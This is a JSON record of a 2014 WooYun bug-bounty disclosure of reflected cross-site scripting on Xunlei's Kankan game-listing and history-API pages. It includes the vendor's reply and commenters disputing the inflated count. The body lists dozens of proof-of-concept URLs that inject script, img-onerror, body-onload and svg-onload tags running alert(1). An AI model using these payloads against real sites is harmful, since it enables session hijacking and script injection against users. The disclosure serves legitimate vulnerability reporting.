{"id": 51318, "wybug_id": "wooyun-2014-074983", "wybug_title": "迅雷看看XSS超大礼包（任意js执行、可调用外部js、指谁打谁、可打cookie）", "wybug_corp": "迅雷", "wybug_author": "残废", "wybug_date": "2014-09-04 09:56", "wybug_open_date": "2014-10-19 09:58", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["反射型", "利用技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-04：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-09-04：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-09-14：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-09-24：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-10-04：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-10-19：\t细节向公众公开  简要描述： xss超大礼包  大概有几十个吧  XSS实在太多  懒得整理了  就整理了这么多了附赠一个 api接口处的xss 详细说明：  xss超大礼包~\nhttp://youxi.kankan.com/list/?sort=update&typeid=8&styleid=9%22/%3E%3C/a%3E%3C/div%3E%3C/div%3E%3C/div%3E%3C/div%3E%3C/div%3E%3C/div%3E%3C/div%3E%3C/div%3E%3Cbody/onload=alert%281%29%3E%3Cimg%20src=x%20onerror=alert%281%29%3E   http://youxi.kankan.com/list/?typeid=2&sort=updatedd%22%3E%3C/a%3E%3Cscript%3Ealert%281%29%3C/script%3E http://youxi.kankan.com/list/?sort=update&typeid=8&styleid=9%22%3E%3C/a%3E%3Cimg%20src=x%20onerror=alert%281%29%3E http://youxi.kankan.com/list/?typeid=2&sort=update%22%3E%3C/a%3E%3Cscript%3Ealert%281%29%3C/script%3E   http://youxi.kankan.com/list/?typeid=5&nameid=1%22%3E%3C/a%3E%3Cimg%20src=x%20onerror=alert%281%29%3E\thttp://youxi.kankan.com/list/?sort=update&typeid=8&styleid=9%22%3E%3C/a%3E%3Cscript%3Ealert%281%29%3C/script%3E  http://youxi.kankan.com/list/?sort=update&typeid=1%22%3E%3C/a%3E%3Cscript%3Ealert%281%29%3C/script%3Ehttp://youxi.kankan.com/list/?sort=hits%22%3E%3C/a%3E%3Cscript%3Ealert%281%29%3C/script%3E http://youxi.kankan.com/list/?nameid=1%22%3E%3C/a%3E%3Cscript%3Ealert%28/x/%29%3C/script%3Ehttp://youxi.kankan.com/list/?sort=update&nameid=111%22%3E%3C/a%3E%3Cscript%3Ealert%281%29%3C/script%3E  http://youxi.kankan.com/list/?typeid=5%22%3E%3C/a%3E%3Cscript%3Ealert%281%29%3C/script%3E http://youxi.kankan.com/list/?nameid=136&sort=update%22%3E%3C/a%3E%3Cscript%3Ealert%28/x/%29%3C/script%3E   http://youxi.kankan.com/list/?artistid=1%22%3E%3C/a%3E%3Cscript%3Ealert%281%29%3C/script%3Ehttp://youxi.kankan.com/list/?typeid=5&styleid=8%22%3E%3C/a%3E%3Cimg%20src=x%20onerror=alert%281%29%3Eyouxi.kankan.com/list/?typeid=5&styleid=8\"></a><img src=x onerror=alert(1)>http://youxi.kankan.com/list/?sort=hits&artistid=24%22%3E%3C/a%3E%3Cscript%3Ealert%281%29%3C/script%3Ehttp://youxi.kankan.com/list/?sort=update&styleid=9%22%3E%3C/a%3E%3Cscript%3Ealert%280%29%3C/script%3Ehttp://youxi.kankan.com/list/?sort=update&typeid=8&styleid=9&artistid=1%22%3E%3C/a%3E%3Cscript%3Ealert%28/x/%29%3C/script%3Ehttp://youxi.kankan.com/list/?typeid=8&styleid=9&sort=hits%22%3E%3C/a%3E%3Cscript%3Ealert%280%29%3C/script%3Ehttp://youxi.kankan.com/list/?nameid=1&%22%3E%3C/a%3E%3Cscript%3Ealert%281%29%3C/script%3Ehttp://youxi.kankan.com/list/?sort=update&styleid=9&typeid=1%22%3E%3C/a%3E%3Cscript%3Ealert%281%29%3C/script%3Ehttp://youxi.kankan.com/list/?sort=update&typeid=8&styleid=9&nameid=19%22%22%3E%3C/a%3E%3Cscript%3Ealert%281%29%3C/script%3Ehttp://youxi.kankan.com/list/?sort=update&typeid=8&styleid=9%22%3E%3C/a%3E%3Cscript%3Ealert%281%29%3C/script%3E&pagenum=2http://youxi.kankan.com/list/?typeid=5&nameid=1&artistid=1%22%3E%3C/a%3E%3C%22%3E%3C/a%3E%3Cscript%3Ealert%281%29%3C/script%3Ehttp://youxi.kankan.com/list/?typeid=2&sort=update&artistid=1%22%3E%3C/a%3E%3Cscript%3Ealert%281%29%3C/script%3Ehttp://youxi.kankan.com/list/?sort=update&%22%3E%3C/a%3E%3Cscript%3Ealert%281%29%3C/script%3Ehttp://youxi.kankan.com/list/?sort=update&typeid=8&styleid=9&nameid=19%22%3E%3C/a%3E%3Cscript%3Ealert%281%29%3C/script%3Eyouxi.kankan.com/list/?typeid=2&sort=update&styleid=1\"></a><script>alert(1)</script>http://youxi.kankan.com/list/?typeid=5&nameid=1&pagenum=2 nameid=1\"></a><script>alert(1)</script>http://youxi.kankan.com/list/?typeid=2&sort=update&nameid=19%22%3E%3C/a%3E%3Cscript%3Ealert%281%29%3C/script%3Ehttp://youxi.kankan.com/list/?typeid=5&nameid=1&sort=hits%22%3E%3C/a%3E%3Cscript%3Ealert%281%29%3C/script%3Ehttp://youxi.kankan.com/list/?typeid=5&nameid=1&artistid=1%22%3E%3C/a%3E%3Cscript%3Ealert%281%29%3C/script%3Ehttp://youxi.kankan.com/list/?typeid=2&sort=update&artistid=1%22%3E%3C/a%3E%3Cscript%3Ealert%281%29%3C/script%3Ehttp://youxi.kankan.com/list/?typeid=2&sort=update&nameid=19%22%3E%3C/a%3E%3Cscript%3Ealert%281%29%3C/script%3Ehttp://youxi.kankan.com/list/?typeid=2&sort=update%22%3E%3C/a%3E%3C%3Cscript%3Ealert%281%29%3C/script%3E&pagenum=2http://youxi.kankan.com/list/?sort=update&%22%3E%3C/a%3E%3Cscript%3Ealert%281%29%3C/script%3Ehttp://youxi.kankan.com/list/?typeid=2&sort=update&styleid=1%22%3E%3C/a%3E%3Cscript%3Ealert%281%29%3C/script%3Ehttp://youxi.kankan.com/list/?typeid=5&nameid=1&sort=hits%22%3E%3C/a%3E%3Cscript%3Ealert%281%29%3C/script%3Ehttp://youxi.kankan.com/list/?typeid=2&sort=update&artistid=1%22%3E%3C/a%3E%3Cscript%3Ealert%281%29%3C/script%3Ehttp://youxi.kankan.com/list/?typeid=2&sort=update&nameid=19%22%3E%3C/a%3E%3Cscript%3Ealert%281%29%3C/script%3Ehttp://youxi.kankan.com/list/?sort=update&typeid=1&nameid=19%22%3E%3C/a%3E%3Cscript%3Ealert%281%29%3C/script%3Ehttp://youxi.kankan.com/list/?sort=update&typeid=1&artistid=1%22%3E%3C/a%3E%3Cscript%3Ealert%281%29%3C/script%3Ehttp://youxi.kankan.com/list/?typeid=2&sort=update%22%3E%3C/a%3E%3Cscript%3Ealert%281%29%3C/script%3Epagenum=2http://youxi.kankan.com/list/?sort=update&typeid=1%22%3E%3C/a%3E%3Cscript%3Ealert%281%29%3C/script%3E&pagenum=2http://youxi.kankan.com/list/?typeid=2&sort=update&styleid=1%22%3E%3C/a%3E%3Cscript%3Ealert%281%29%3C/script%3Ehttp://youxi.kankan.com/list/?sort=update&typeid=1&artistid=1%22%3E%3C/a%3E%3Cscript%3Ealert%281%29%3C/script%3Ehttp://youxi.kankan.com/list/?sort=update&typeid=1&nameid=19%22%3E%3C/a%3E%3Cscript%3Ealert%281%29%3C/script%3Ehttp://youxi.kankan.com/list/?sort=update&typeid=1%22%3E%3C/a%3E%3Cscript%3Ealert%281%29%3C/script%3E&pagenum=2http://youxi.kankan.com/list/?sort=update&typeid=1&artistid=1%22%3E%3C/a%3E%3Cscript%3Ealert%281%29%3C/script%3E\n附赠API一处XSS\nhttp://api.history.kankan.com/history.php?action=query&var_name=%3Csvg/onload=alert%281%29%3ENowadaysMovies&uid=101851468&%22\n   漏洞证明：  xss超大礼包~\nhttp://youxi.kankan.com/list/?sort=update&typeid=8&styleid=9%22/%3E%3C/a%3E%3C/div%3E%3C/div%3E%3C/div%3E%3C/div%3E%3C/div%3E%3C/div%3E%3C/div%3E%3C/div%3E%3Cbody/onload=alert%281%29%3E%3Cimg%20src=x%20onerror=alert%281%29%3E   http://youxi.kankan.com/list/?typeid=2&sort=updatedd%22%3E%3C/a%3E%3Cscript%3Ealert%281%29%3C/script%3E http://youxi.kankan.com/list/?sort=update&typeid=8&styleid=9%22%3E%3C/a%3E%3Cimg%20src=x%20onerror=alert%281%29%3E http://youxi.kankan.com/list/?typeid=2&sort=update%22%3E%3C/a%3E%3Cscript%3Ealert%281%29%3C/script%3E   http://youxi.kankan.com/list/?typeid=5&nameid=1%22%3E%3C/a%3E%3Cimg%20src=x%20onerror=alert%281%29%3E\thttp://youxi.kankan.com/list/?sort=update&typeid=8&styleid=9%22%3E%3C/a%3E%3Cscript%3Ealert%281%29%3C/script%3E  http://youxi.kankan.com/list/?sort=update&typeid=1%22%3E%3C/a%3E%3Cscript%3Ealert%281%29%3C/script%3Ehttp://youxi.kankan.com/list/?sort=hits%22%3E%3C/a%3E%3Cscript%3Ealert%281%29%3C/script%3E http://youxi.kankan.com/list/?nameid=1%22%3E%3C/a%3E%3Cscript%3Ealert%28/x/%29%3C/script%3Ehttp://youxi.kankan.com/list/?sort=update&nameid=111%22%3E%3C/a%3E%3Cscript%3Ealert%281%29%3C/script%3E  http://youxi.kankan.com/list/?typeid=5%22%3E%3C/a%3E%3Cscript%3Ealert%281%29%3C/script%3E http://youxi.kankan.com/list/?nameid=136&sort=update%22%3E%3C/a%3E%3Cscript%3Ealert%28/x/%29%3C/script%3E   http://youxi.kankan.com/list/?artistid=1%22%3E%3C/a%3E%3Cscript%3Ealert%281%29%3C/script%3Ehttp://youxi.kankan.com/list/?typeid=5&styleid=8%22%3E%3C/a%3E%3Cimg%20src=x%20onerror=alert%281%29%3Eyouxi.kankan.com/list/?typeid=5&styleid=8\"></a><img src=x onerror=alert(1)>http://youxi.kankan.com/list/?sort=hits&artistid=24%22%3E%3C/a%3E%3Cscript%3Ealert%281%29%3C/script%3Ehttp://youxi.kankan.com/list/?sort=update&styleid=9%22%3E%3C/a%3E%3Cscript%3Ealert%280%29%3C/script%3Ehttp://youxi.kankan.com/list/?sort=update&typeid=8&styleid=9&artistid=1%22%3E%3C/a%3E%3Cscript%3Ealert%28/x/%29%3C/script%3Ehttp://youxi.kankan.com/list/?typeid=8&styleid=9&sort=hits%22%3E%3C/a%3E%3Cscript%3Ealert%280%29%3C/script%3Ehttp://youxi.kankan.com/list/?nameid=1&%22%3E%3C/a%3E%3Cscript%3Ealert%281%29%3C/script%3Ehttp://youxi.kankan.com/list/?sort=update&styleid=9&typeid=1%22%3E%3C/a%3E%3Cscript%3Ealert%281%29%3C/script%3Ehttp://youxi.kankan.com/list/?sort=update&typeid=8&styleid=9&nameid=19%22%22%3E%3C/a%3E%3Cscript%3Ealert%281%29%3C/script%3Ehttp://youxi.kankan.com/list/?sort=update&typeid=8&styleid=9%22%3E%3C/a%3E%3Cscript%3Ealert%281%29%3C/script%3E&pagenum=2http://youxi.kankan.com/list/?typeid=5&nameid=1&artistid=1%22%3E%3C/a%3E%3C%22%3E%3C/a%3E%3Cscript%3Ealert%281%29%3C/script%3Ehttp://youxi.kankan.com/list/?typeid=2&sort=update&artistid=1%22%3E%3C/a%3E%3Cscript%3Ealert%281%29%3C/script%3Ehttp://youxi.kankan.com/list/?sort=update&%22%3E%3C/a%3E%3Cscript%3Ealert%281%29%3C/script%3Ehttp://youxi.kankan.com/list/?sort=update&typeid=8&styleid=9&nameid=19%22%3E%3C/a%3E%3Cscript%3Ealert%281%29%3C/script%3Eyouxi.kankan.com/list/?typeid=2&sort=update&styleid=1\"></a><script>alert(1)</script>http://youxi.kankan.com/list/?typeid=5&nameid=1&pagenum=2 nameid=1\"></a><script>alert(1)</script>http://youxi.kankan.com/list/?typeid=2&sort=update&nameid=19%22%3E%3C/a%3E%3Cscript%3Ealert%281%29%3C/script%3Ehttp://youxi.kankan.com/list/?typeid=5&nameid=1&sort=hits%22%3E%3C/a%3E%3Cscript%3Ealert%281%29%3C/script%3Ehttp://youxi.kankan.com/list/?typeid=5&nameid=1&artistid=1%22%3E%3C/a%3E%3Cscript%3Ealert%281%29%3C/script%3Ehttp://youxi.kankan.com/list/?typeid=2&sort=update&artistid=1%22%3E%3C/a%3E%3Cscript%3Ealert%281%29%3C/script%3Ehttp://youxi.kankan.com/list/?typeid=2&sort=update&nameid=19%22%3E%3C/a%3E%3Cscript%3Ealert%281%29%3C/script%3Ehttp://youxi.kankan.com/list/?typeid=2&sort=update%22%3E%3C/a%3E%3C%3Cscript%3Ealert%281%29%3C/script%3E&pagenum=2http://youxi.kankan.com/list/?sort=update&%22%3E%3C/a%3E%3Cscript%3Ealert%281%29%3C/script%3Ehttp://youxi.kankan.com/list/?typeid=2&sort=update&styleid=1%22%3E%3C/a%3E%3Cscript%3Ealert%281%29%3C/script%3Ehttp://youxi.kankan.com/list/?typeid=5&nameid=1&sort=hits%22%3E%3C/a%3E%3Cscript%3Ealert%281%29%3C/script%3Ehttp://youxi.kankan.com/list/?typeid=2&sort=update&artistid=1%22%3E%3C/a%3E%3Cscript%3Ealert%281%29%3C/script%3Ehttp://youxi.kankan.com/list/?typeid=2&sort=update&nameid=19%22%3E%3C/a%3E%3Cscript%3Ealert%281%29%3C/script%3Ehttp://youxi.kankan.com/list/?sort=update&typeid=1&nameid=19%22%3E%3C/a%3E%3Cscript%3Ealert%281%29%3C/script%3Ehttp://youxi.kankan.com/list/?sort=update&typeid=1&artistid=1%22%3E%3C/a%3E%3Cscript%3Ealert%281%29%3C/script%3Ehttp://youxi.kankan.com/list/?typeid=2&sort=update%22%3E%3C/a%3E%3Cscript%3Ealert%281%29%3C/script%3Epagenum=2http://youxi.kankan.com/list/?sort=update&typeid=1%22%3E%3C/a%3E%3Cscript%3Ealert%281%29%3C/script%3E&pagenum=2http://youxi.kankan.com/list/?typeid=2&sort=update&styleid=1%22%3E%3C/a%3E%3Cscript%3Ealert%281%29%3C/script%3Ehttp://youxi.kankan.com/list/?sort=update&typeid=1&artistid=1%22%3E%3C/a%3E%3Cscript%3Ealert%281%29%3C/script%3Ehttp://youxi.kankan.com/list/?sort=update&typeid=1&nameid=19%22%3E%3C/a%3E%3Cscript%3Ealert%281%29%3C/script%3Ehttp://youxi.kankan.com/list/?sort=update&typeid=1%22%3E%3C/a%3E%3Cscript%3Ealert%281%29%3C/script%3E&pagenum=2http://youxi.kankan.com/list/?sort=update&typeid=1&artistid=1%22%3E%3C/a%3E%3Cscript%3Ealert%281%29%3C/script%3E\n附赠API一处XSS\nhttp://api.history.kankan.com/history.php?action=query&var_name=%3Csvg/onload=alert%281%29%3ENowadaysMovies&uid=101851468&%22\n   修复方案：  雷先生：“上次看你给黄小姐挖了那么多XSS，今天你怎么又可以给我挖这么多呢？”残疾人：“你猜”雷先生：“你是如何挖到这么多的XSS的？”残疾人：“你猜”雷先生：“你这么叼你爸妈知道吗？”残疾人：“你猜”雷先生：“那如何修复？”残疾人：“杀人不一定要用好刀  请换个会杀人的武林高手！”   版权声明：转载请注明来源 残废@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：3  确认时间：2014-09-04 10:27 厂商回复： 漏洞已确认 共计两个网站6处参数存在缺陷，正在修补感谢您对迅雷安全的支持！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-09-04 10:13 |    \t\t数据流 \t\t\t( 普通白帽子  |\t\t\t        Rank:716 漏洞数:88        | all or nothing,now or never)\t\t \n  @疯狗 审核力度不够呀。。。 说是几十个xss  其实就发了几十个alert。。都是同一个网站 就四五个参数有问题而已，这样也叫xss礼包呀？。危害等级还评为高了？。。。。    \n     2014-09-04 10:32 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  @数据流 嗯，继续加强审核，该漏洞已调整为小漏洞    \n     2014-09-04 10:35 |    \t\t残废 \t\t\t( 普通白帽子  |\t\t\t        Rank:179 漏洞数:40        | 我是残废，啦啦啦啦)\t\t \n  @数据流   我承认我是白。。    \n     2014-09-04 10:49 |    \t\t数据流 \t\t\t( 普通白帽子  |\t\t\t        Rank:716 漏洞数:88        | all or nothing,now or never)\t\t \n  @疯狗 感谢理解。: )    \n     2014-09-24 11:42 |    \t\t老和尚 \t\t\t( 普通白帽子  |\t\t\t        Rank:223 漏洞数:45        | 总有一天，我会骑着雨牛@'雨。踩着一哥@jan...)\t\t \n  @数据流 数据库逗逼，别欺负我儿残废    \n     2014-10-23 14:31 |    \t\tManning \t\t\t( 普通白帽子  |\t\t\t        Rank:559 漏洞数:78        | 就恨自己服务器太少)\t\t \n  我就喜欢这个，样本量大    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 3, "Ranks": null}